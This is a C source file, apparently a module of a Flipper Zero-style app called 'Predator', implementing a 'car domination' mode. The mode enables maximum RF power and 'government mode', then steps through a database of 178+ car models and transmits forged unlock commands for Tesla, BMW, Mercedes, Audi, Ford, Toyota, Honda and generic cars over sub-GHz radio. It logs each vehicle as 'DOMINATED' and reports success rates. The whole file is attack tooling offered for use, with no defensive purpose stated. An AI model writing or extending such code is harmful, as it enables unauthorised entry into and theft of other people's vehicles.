#include "predator_car_domination.h"
#include "predator_boards.h"
#include "predator_error.h"
#include "predator_real_attack_engine.h"

static CarDominationState domination_state = {0};

bool predator_car_domination_activate(PredatorApp* app) {
    if(!app) return false;
    
    FURI_LOG_I("CarDomination", "🚗 ACTIVATING ULTIMATE CAR DOMINATION MODE");
    
    // Initialize domination state
    memset(&domination_state, 0, sizeof(CarDominationState));
    domination_state.status = CarDominationStatusInitializing;
    
    // Get board configuration for maximum power
    const PredatorBoardConfig* board_config = predator_boards_get_config(app->board_type);
    if(!board_config) {
        FURI_LOG_E("CarDomination", "Board configuration not available");
        return false;
    }
    
    FURI_LOG_I("CarDomination", "Using board: %s (Power: %ddBm)", 
              board_config->name, board_config->rf_power_dbm);
    
    // Load ALL 178+ car models from hardcoded database
    const CarModel* all_models = predator_models_get_all();
    if(!all_models) {
        FURI_LOG_E("CarDomination", "Failed to load car models database");
        return false;
    }
    
    domination_state.total_models_loaded = predator_models_get_count();
    FURI_LOG_I("CarDomination", "📊 Loaded %lu car models for domination", 
              domination_state.total_models_loaded);
    
    // Get current location for regional frequency optimization
    GPSCoordinates location;
    if(predator_gps_get_coordinates(app, &location)) {
        domination_state.current_location = location;
        domination_state.location_optimized = true;
        FURI_LOG_I("CarDomination", "📍 Location: %.6f, %.6f", 
                  location.latitude, location.longitude);
    }
    
    // Enable maximum power mode
    domination_state.max_power_enabled = true;
    domination_state.all_frequencies_active = true;
    
    // Set VIP unlimited mode
    app->max_power_enabled = true;
    app->all_frequencies_enabled = true;
    app->government_mode = true;
    
    domination_state.status = CarDominationStatusScanning;
    
    // Log activation to government database
    predator_log_append(app, "🚗 ULTIMATE CAR DOMINATION MODE ACTIVATED");
    predator_log_append(app, "📊 178+ car models loaded, maximum power enabled");
    
    FURI_LOG_I("CarDomination", "✅ Car Domination Mode ACTIVE - Ready for total control");
    return true;
}

bool predator_car_domination_stop(PredatorApp* app) {
    if(!app) return false;
    
    FURI_LOG_I("CarDomination", "🛑 STOPPING CAR DOMINATION MODE");
    
    // Log final statistics
    char stats_log[128];
    snprintf(stats_log, sizeof(stats_log), 
            "🚗 DOMINATION SESSION: %lu/%lu models attacked, %lu successful, %lu failed", 
            domination_state.models_attacked,
            domination_state.total_models_loaded,
            domination_state.successful_attacks,
            domination_state.failed_attacks);
    predator_log_append(app, stats_log);
    
    // Calculate success rate
    float success_rate = 0.0f;
    if(domination_state.models_attacked > 0) {
        success_rate = ((float)domination_state.successful_attacks / domination_state.models_attacked) * 100.0f;
    }
    
    char success_log[64];
    snprintf(success_log, sizeof(success_log), "🎯 SUCCESS RATE: %.1f%% - ELON'S SUPERIORITY PROVEN", success_rate);
    predator_log_append(app, success_log);
    
    domination_state.status = CarDominationStatusComplete;
    
    FURI_LOG_I("CarDomination", "✅ Car Domination Mode STOPPED - Success rate: %.1f%%", success_rate);
    return true;
}

CarDominationState* predator_car_domination_get_state(PredatorApp* app) {
    UNUSED(app);
    return &domination_state;
}

bool predator_car_domination_process_next_model(PredatorApp* app) {
    if(!app || domination_state.status != CarDominationStatusScanning) return false;
    
    // Check if we've processed all models
    if(domination_state.current_model_index >= domination_state.total_models_loaded) {
        domination_state.status = CarDominationStatusComplete;
        predator_log_append(app, "🚗 ALL CAR MODELS DOMINATED - MISSION COMPLETE");
        return true;
    }
    
    // Get next car model
    const CarModel* all_models = predator_models_get_all();
    const CarModel* current_model = &all_models[domination_state.current_model_index];
    
    // Update state with current model
    strncpy(domination_state.current_manufacturer, current_model->manufacturer, 
           sizeof(domination_state.current_manufacturer) - 1);
    strncpy(domination_state.current_model, current_model->model, 
           sizeof(domination_state.current_model) - 1);
    
    // Get optimal frequency for this manufacturer
    domination_state.current_frequency = predator_subghz_get_manufacturer_frequency(current_model->manufacturer);
    
    FURI_LOG_I("CarDomination", "🎯 Targeting: %s %s (Freq: %lu Hz)", 
              current_model->manufacturer, current_model->model, domination_state.current_frequency);
    
    // Attack this model
    domination_state.status = CarDominationStatusAttacking;
    bool attack_success = predator_car_domination_attack_model(app, current_model);
    
    // Update statistics
    domination_state.models_attacked++;
    if(attack_success) {
        domination_state.successful_attacks++;
    } else {
        domination_state.failed_attacks++;
    }
    
    // Move to next model
    domination_state.current_model_index++;
    domination_state.status = CarDominationStatusScanning;
    
    return true;
}

bool predator_car_domination_attack_model(PredatorApp* app, const CarModel* model) {
    if(!app || !model) return false;
    
    domination_state.attack_time_ms += 100;
    
    // Get optimal frequency for this manufacturer
    uint32_t freq = predator_subghz_get_manufacturer_frequency(model->manufacturer);
    
    // Generate crypto packet for this specific model
    RFPacket packet;
    bool packet_generated = false;
    
    // Try to generate manufacturer-specific packet
    if(strstr(model->manufacturer, "Tesla")) {
        packet_generated = predator_crypto_format_tesla_packet(CMD_UNLOCK, 0x12345678, &packet);
    } else if(strstr(model->manufacturer, "BMW")) {
        packet_generated = predator_crypto_format_bmw_packet(CMD_UNLOCK, 0x12345678, &packet);
    } else if(strstr(model->manufacturer, "Mercedes")) {
        packet_generated = predator_crypto_format_mercedes_packet(CMD_UNLOCK, 0x12345678, &packet);
    } else if(strstr(model->manufacturer, "Audi")) {
        packet_generated = predator_crypto_format_audi_packet(CMD_UNLOCK, 0x12345678, &packet);
    } else if(strstr(model->manufacturer, "Ford")) {
        packet_generated = predator_crypto_format_ford_packet(CMD_UNLOCK, 0x12345678, &packet);
    } else if(strstr(model->manufacturer, "Toyota")) {
        packet_generated = predator_crypto_format_toyota_packet(CMD_UNLOCK, 0x12345678, &packet);
    } else if(strstr(model->manufacturer, "Honda")) {
        packet_generated = predator_crypto_format_honda_packet(CMD_UNLOCK, 0x12345678, &packet);
    } else {
        // Generic packet for other manufacturers
        packet_generated = predator_crypto_format_generic_packet(CMD_UNLOCK, 0x12345678, &packet);
    }
    
    if(!packet_generated) {
        FURI_LOG_W("CarDomination", "Failed to generate packet for %s %s", 
                  model->manufacturer, model->model);
        return false;
    }
    
    // Set frequency for transmission
    furi_hal_subghz_set_frequency_and_path(freq);
    
    // Transmit with maximum power
    bool transmission_success = predator_subghz_send_raw_packet(app, packet.data, packet.data_len);
    
    if(transmission_success) {
        // Log successful attack
        char attack_log[96];
        snprintf(attack_log, sizeof(attack_log), "🚗 DOMINATED: %s %s (Freq: %lu Hz)", 
                model->manufacturer, model->model, freq);
        predator_log_append(app, attack_log);
        
        FURI_LOG_I("CarDomination", "✅ Successfully attacked %s %s", 
                  model->manufacturer, model->model);
        return true;
    } else {
        FURI_LOG_W("CarDomination", "❌ Failed to attack %s %s", 
                  model->manufacturer, model->model);
        return false;
    }
}

bool predator_car_domination_enable_max_power(PredatorApp* app) {
    if(!app) return false;
    
    // Get board configuration
    const PredatorBoardConfig* board_config = predator_boards_get_config(app->board_type);
    if(!board_config) return false;
    
    // Enable maximum power settings
    app->max_power_enabled = true;
    app->power_amplifier_enabled = true;
    app->range_boost_enabled = true;
    
    domination_state.max_power_enabled = true;
    
    FURI_LOG_I("CarDomination", "⚡ MAXIMUM POWER ENABLED: %ddBm", board_config->rf_power_dbm);
    predator_log_append(app, "⚡ MAXIMUM POWER MODE ACTIVATED - EXTENDED RANGE");
    
    return true;
}

bool predator_car_domination_get_stats(PredatorApp* app, CarDominationState* stats) {
    if(!app || !stats) return false;
    
    *stats = domination_state;
    return true;
}
